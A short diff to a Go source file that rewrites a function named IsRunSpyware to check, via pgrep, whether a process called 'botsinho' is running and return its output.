@@ -4,7 +4,7 @@ import (
 	//"fmt"
 
 	"fmt"
-	"strings"
+	
 
 	"os/exec"
 	"runtime"
@@ -56,12 +56,15 @@ func DeleteSpy(){
 	
 }
 
-func IsRunSpyware()bool{
-	com := exec.Command("bash", "-c", "ps aux | grep -o 3001")
+func IsRunSpyware()(bool, string){
+	com := exec.Command("bash", "-c", "pgrep botsinho")
 	out, _ := com.Output()
-	dat := strings.Split(strings.Replace(string(out), "\n", " ", 5), " ")
+	//dat := strings.Split(strings.Replace(string(out), "\n", " ", 5), " ")
 	
-	return len(dat) > 1
+	if(string(out)!=""){
+		return true, string(out)
+	}
+	return false,string(out)
 
 
 }
